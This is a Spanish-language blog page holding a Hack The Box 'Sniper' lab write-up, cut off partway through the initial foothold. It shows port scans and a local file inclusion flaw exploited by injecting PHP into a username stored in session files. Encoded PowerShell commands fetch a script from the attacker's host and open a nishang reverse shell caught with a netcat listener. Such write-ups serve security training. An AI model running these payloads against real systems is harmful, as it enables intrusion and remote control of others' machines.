<!doctype html>
<html lang="es">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="/pointed.png" />

<title>Hack The Box: Sniper Writeup | Medium&nbsp;|&nbsp;Bajo el Teclado</title>
<meta
  name="title"
  content="Hack The Box: Sniper Writeup | Medium"
/>
<meta
  name="description"
  content="Hack The Box: Sniper Writeup
Welcome to my detailed writeup of the medium difficulty machine &ldquo;Sniper&rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration






1rustscan -a 10.129.229.6 --ulimit 5000 -g
210.129.229.6 -&gt; [80,135,139,445,49667]






 1nmap -p80,135,139,445,49667 -sCV 10.129.229.6 -oN allPorts
 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:30 CEST
 3Nmap scan report for 10.129.229.6
 4Host is up (0.041s latency).
 5
 6PORT      STATE SERVICE       VERSION
 780/tcp    open  http          Microsoft IIS httpd 10.0
 8|_http-title: Sniper Co.
 9|_http-server-header: Microsoft-IIS/10.0
10| http-methods: 
11|_  Potentially risky methods: TRACE
12135/tcp   open  msrpc         Microsoft Windows RPC
13139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
14445/tcp   open  microsoft-ds?
1549667/tcp open  msrpc         Microsoft Windows RPC
16Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
17
18Host script results:
19|_clock-skew: 5h00m02s
20| smb2-security-mode: 
21|   3:1:1: 
22|_    Message signing enabled but not required
23| smb2-time: 
24|   date: 2024-08-24T01:31:47
25|_  start_date: N/A
26
27Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
28Nmap done: 1 IP address (1 host up) scanned in 95.63 seconds
UDP Enumeration






1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.229.6 -oN allPorts.UDP
2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:32 CEST
3Nmap scan report for 10.129.229.6
4Host is up.
5All 1500 scanned ports on 10.129.229.6 are in ignored states.
6Not shown: 1500 open|filtered udp ports (no-response)
7
8Nmap done: 1 IP address (1 host up) scanned in 2.41 seconds
No podemos listar contenido mediante una null session en el SMB"
/>
<meta
  name="keywords"
  content="HackTheBox,Sniper,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,RCE,Exploit,Windows,Local File Inclusion,Abusing PHP Session Temp Files,Bypassing,Information Leakage,User Pivoting,Weaponizing CHM file,"
/>

  <meta name="author" content="Andrés Del Cerro" />




<meta property="og:url" content="http://localhost:1313/writeups/sniper---hackthebox/">
  <meta property="og:site_name" content="Bajo el Teclado">
  <meta property="og:title" content="Hack The Box: Sniper Writeup | Medium">
  <meta property="og:description" content="Hack The Box: Sniper Writeup Welcome to my detailed writeup of the medium difficulty machine “Sniper” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1rustscan -a 10.129.229.6 --ulimit 5000 -g 210.129.229.6 -&gt; [80,135,139,445,49667]1nmap -p80,135,139,445,49667 -sCV 10.129.229.6 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:30 CEST 3Nmap scan report for 10.129.229.6 4Host is up (0.041s latency). 5 6PORT STATE SERVICE VERSION 780/tcp open http Microsoft IIS httpd 10.0 8|_http-title: Sniper Co. 9|_http-server-header: Microsoft-IIS/10.0 10| http-methods: 11|_ Potentially risky methods: TRACE 12135/tcp open msrpc Microsoft Windows RPC 13139/tcp open netbios-ssn Microsoft Windows netbios-ssn 14445/tcp open microsoft-ds? 1549667/tcp open msrpc Microsoft Windows RPC 16Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 17 18Host script results: 19|_clock-skew: 5h00m02s 20| smb2-security-mode: 21| 3:1:1: 22|_ Message signing enabled but not required 23| smb2-time: 24| date: 2024-08-24T01:31:47 25|_ start_date: N/A 26 27Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 28Nmap done: 1 IP address (1 host up) scanned in 95.63 secondsUDP Enumeration 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.229.6 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:32 CEST 3Nmap scan report for 10.129.229.6 4Host is up. 5All 1500 scanned ports on 10.129.229.6 are in ignored states. 6Not shown: 1500 open|filtered udp ports (no-response) 7 8Nmap done: 1 IP address (1 host up) scanned in 2.41 secondsNo podemos listar contenido mediante una null session en el SMB">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-08-23T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-08-23T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Sniper">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Cybersecurity">
    <meta property="article:tag" content="Penetration Testing">
    <meta property="article:tag" content="CTF">





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Hack The Box: Sniper Writeup | Medium">
  <meta name="twitter:description" content="Hack The Box: Sniper Writeup Welcome to my detailed writeup of the medium difficulty machine “Sniper” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1rustscan -a 10.129.229.6 --ulimit 5000 -g 210.129.229.6 -&gt; [80,135,139,445,49667]1nmap -p80,135,139,445,49667 -sCV 10.129.229.6 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:30 CEST 3Nmap scan report for 10.129.229.6 4Host is up (0.041s latency). 5 6PORT STATE SERVICE VERSION 780/tcp open http Microsoft IIS httpd 10.0 8|_http-title: Sniper Co. 9|_http-server-header: Microsoft-IIS/10.0 10| http-methods: 11|_ Potentially risky methods: TRACE 12135/tcp open msrpc Microsoft Windows RPC 13139/tcp open netbios-ssn Microsoft Windows netbios-ssn 14445/tcp open microsoft-ds? 1549667/tcp open msrpc Microsoft Windows RPC 16Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 17 18Host script results: 19|_clock-skew: 5h00m02s 20| smb2-security-mode: 21| 3:1:1: 22|_ Message signing enabled but not required 23| smb2-time: 24| date: 2024-08-24T01:31:47 25|_ start_date: N/A 26 27Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 28Nmap done: 1 IP address (1 host up) scanned in 95.63 secondsUDP Enumeration 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.229.6 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:32 CEST 3Nmap scan report for 10.129.229.6 4Host is up. 5All 1500 scanned ports on 10.129.229.6 are in ignored states. 6Not shown: 1500 open|filtered udp ports (no-response) 7 8Nmap done: 1 IP address (1 host up) scanned in 2.41 secondsNo podemos listar contenido mediante una null session en el SMB">





  <meta itemprop="name" content="Hack The Box: Sniper Writeup | Medium">
  <meta itemprop="description" content="Hack The Box: Sniper Writeup Welcome to my detailed writeup of the medium difficulty machine “Sniper” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1rustscan -a 10.129.229.6 --ulimit 5000 -g 210.129.229.6 -&gt; [80,135,139,445,49667]1nmap -p80,135,139,445,49667 -sCV 10.129.229.6 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:30 CEST 3Nmap scan report for 10.129.229.6 4Host is up (0.041s latency). 5 6PORT STATE SERVICE VERSION 780/tcp open http Microsoft IIS httpd 10.0 8|_http-title: Sniper Co. 9|_http-server-header: Microsoft-IIS/10.0 10| http-methods: 11|_ Potentially risky methods: TRACE 12135/tcp open msrpc Microsoft Windows RPC 13139/tcp open netbios-ssn Microsoft Windows netbios-ssn 14445/tcp open microsoft-ds? 1549667/tcp open msrpc Microsoft Windows RPC 16Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 17 18Host script results: 19|_clock-skew: 5h00m02s 20| smb2-security-mode: 21| 3:1:1: 22|_ Message signing enabled but not required 23| smb2-time: 24| date: 2024-08-24T01:31:47 25|_ start_date: N/A 26 27Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 28Nmap done: 1 IP address (1 host up) scanned in 95.63 secondsUDP Enumeration 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.229.6 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:32 CEST 3Nmap scan report for 10.129.229.6 4Host is up. 5All 1500 scanned ports on 10.129.229.6 are in ignored states. 6Not shown: 1500 open|filtered udp ports (no-response) 7 8Nmap done: 1 IP address (1 host up) scanned in 2.41 secondsNo podemos listar contenido mediante una null session en el SMB">
  <meta itemprop="datePublished" content="2024-08-23T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-08-23T00:00:00+00:00">
  <meta itemprop="wordCount" content="1468">
  <meta itemprop="keywords" content="HackTheBox,Sniper,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,RCE,Exploit,Windows,Local File Inclusion,Abusing PHP Session Temp Files,Bypassing,Information Leakage,User Pivoting,Weaponizing CHM File">
<meta name="referrer" content="no-referrer-when-downgrade" />

    
    <link href="/simple.min.css" rel="stylesheet" />

    
    <link href="/style.min.css" rel="stylesheet" />

    

    
</head>

  <body>
    <header>
      <nav>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZHDKLM7DD2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-ZHDKLM7DD2');
</script>


  <a
    href="/"
    
    >Home</a
  >

  <a
    href="/about/"
    
    >About me</a
  >

  <a
    href="/writeups/"
    
    >Writeup&#39;s</a
  >


</nav>
<div style="display: flex; justify-content: center; align-items: center">
  <div style="display: flex; width: 20rem; gap: 2rem;">
    <img src="yo.png" alt="">
    <h1>Hack The Box: Sniper Writeup | Medium</h1>
  </div>
</div>


    </header>
    <main>
      
  
  
  <content>
    <h1 id="hack-the-box-sniper-writeup">Hack The Box: Sniper Writeup</h1>
<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Sniper&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>rustscan -a 10.129.229.6 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.229.6 -&gt; [80,135,139,445,49667]</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>nmap -p80,135,139,445,49667 -sCV 10.129.229.6 -oN allPorts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:30 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.229.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.041s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>|_http-title: Sniper Co.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>| http-methods: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>Host script results:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>|_clock-skew: 5h00m02s
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>|   3:1:1: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>| smb2-time: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>|   date: 2024-08-24T01:31:47
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 95.63 seconds</span></span></code></pre></div>
<h1 id="udp-enumeration">UDP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn 10.129.229.6 -oN allPorts.UDP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 22:32 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.229.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Host is up.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>All <span style="color:#ff0;font-weight:bold">1500</span> scanned ports on 10.129.229.6 are in ignored states.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>Not shown: <span style="color:#ff0;font-weight:bold">1500</span> open|filtered udp ports (no-response)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 2.41 seconds</span></span></code></pre></div>
<p>No podemos listar contenido mediante una null session en el SMB</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>smbclient -L <span style="color:#0ff;font-weight:bold">\\</span>10.129.229.6 -N -U <span style="color:#0ff;font-weight:bold">&#39;null&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>session setup failed: NT_STATUS_LOGON_FAILURE</span></span></code></pre></div>
<h1 id="http-enumeration">HTTP Enumeration</h1>
<p>Así se ve el sitio web.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Vemos un panel de autenticación
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Al iniciar sesión&hellip;</p>
<p>Parece que no está construido el portal del usuario pero la sesión está iniciada.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p><img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Vemos también un blog.
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<h2 id="local-file-inclusion">Local File Inclusion</h2>
<p>Vemos también algo raro, podemos cambiar de idioma pero parece que se apunta a un archivo PHP en el sistema a través del parámetro <code>lang</code>
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Después de probar algunos payloads de LFI para Windows, encontré que el servidor respondía al siguiente recurso del sistema.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p><img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Podemos intentar cargar un recurso remoto de nuestra máquina de atacante pero no funciona.
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Me encontré <a href="https://www.pwny.cc/web-attacks/local-file-inclusion-lfi/lfi-to-rce">la siguiente publicación</a> en la que te dice la ruta donde se guardan los archivos asociados a una sesión en PHP pero en Linux.
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Como PHP funciona igual en Windows significa que debe de almacenarse estos datos de sesión en alguna parte del sistema.</p>
<p>Con una simple búsqueda en Google encontré <a href="https://stackoverflow.com/questions/37603993/php-sessions-default-save-location-for-windows">este post en StackOverFlow</a>
<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Y parece que hemos dado con el archivo.
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>Y se refleja la siguiente información.
<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
<p>Podemos intentar crearnos un usuario en el sistema con un nombre de usuario malicioso para intentar inyectar código PHP.</p>
<p>Después de intentar crear una cuenta como el usuario <code>&lt;?php phpinfo(); ?&gt;</code> me reportaba todo el rato que el usuario era inválido.</p>
<p>Sin embargo si que podía crear un usuario como que es una forma válida para ejecutar comandos en PHP.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>&lt;?=<span style="color:#0ff;font-weight:bold">`powershell whoami`</span><span style="color:#0f0;font-weight:bold">?&gt;</span><span style="color:#f00">
</span></span></span></code></pre></div>
<p>Y podemos comprobar que el comando se ejecuta en el sistema.
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p>Intentando utilizar el típico oneliner powershell de <a href="https://www.revshells.com/">RevShells.com</a>
<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
<h1 id="foothold">Foothold</h1>
<p>Por lo cual tiene que haber algún carácter que considera malicioso y en este caso debe de ser <code>-</code></p>
<p>Después de probar un rato intentando forjar mi propio oneliner me encontré con este post que explica una cosa importante a la hora de generar el base64.
<a href="https://nvd.codes/post/correctly-encode-powershell-payloads-for-exploits/">https://nvd.codes/post/correctly-encode-powershell-payloads-for-exploits/</a></p>
<blockquote>
<p>PowerShell is built with dotnet, which means that strings should be Unicode encoded. Unicode in Windows-lingo means little-endian UTF-16. But when encoding the output of echo in Linux we basically have a UTF-8 encoded string. To fix this we can use iconv to convert to UTF-16LE:</p>
</blockquote>
<p>Y es que el encoding de PoweShell as estar construida en .NET es UTF-16LE y no UTF-8</p>
<p>Podemos ver que el payload es distinto
<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
<p>Haciendo una prueba en local vemos que ahora si que recibimos algo&hellip;
<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
<p>Ahora falta una manera para poder crear un usuario utilizando como nombre de usuario nuestro payload&hellip;</p>
<p>También detecté que probablemente haya una restricción en la longitud del nombre de usuario.</p>
<p>Así que después de un rato creé un usuario con este nombre y después ejecuté el código inyectado en el usuario a través del LFI encontrado.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#39;wget &#34;10.10.14.50:8081/r.ps1&#34; -OutFile &#34;C:\Windows\Temp\r.ps1&#34;&#39;</span> | iconv -t UTF-16LE | base64 -w <span style="color:#ff0;font-weight:bold">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>dwBnAGUAdAAgACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAwADoAOAAwADgAMQAvAHIALgBwAHMAMQAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHIALgBwAHMAMQAiAAoA</span></span></code></pre></div>
<p><strong>No olvidar agregar el <code>&lt;?=`powershell /enc PAYLOAD`?&gt;</code> al nombre de usuario</strong></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>python3 -m http.server <span style="color:#ff0;font-weight:bold">8081</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#ff0;font-weight:bold">8081</span> (http://0.0.0.0:8081/) ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>10.129.229.6 - - [23/Aug/2024 23:34:28] <span style="color:#0ff;font-weight:bold">&#34;GET /r.ps1 HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">200</span> -</span></span></code></pre></div>
<p>Este script es el típico <code>Invoke-PowerShellTcp.ps1</code> de <code>nishang</code> pero agregando esta línea al final del script.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.50 -Port <span style="color:#ff0;font-weight:bold">443</span></span></span></code></pre></div>
<p>Ahora solo falta ejecutar el script descargado&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#39;powershell C:\Windows\Temp\r.ps1&#39;</span> | iconv -t UTF-16LE | base64 -w <span style="color:#ff0;font-weight:bold">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>cABvAHcAZQByAHMAaABlAGwAbAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcgAuAHAAcwAxAAoA</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.50] from (UNKNOWN) [10.129.229.6] <span style="color:#ff0;font-weight:bold">49806</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Windows PowerShell running as user SNIPER$ on SNIPER
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Copyright (C) <span style="color:#ff0;font-weight:bold">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
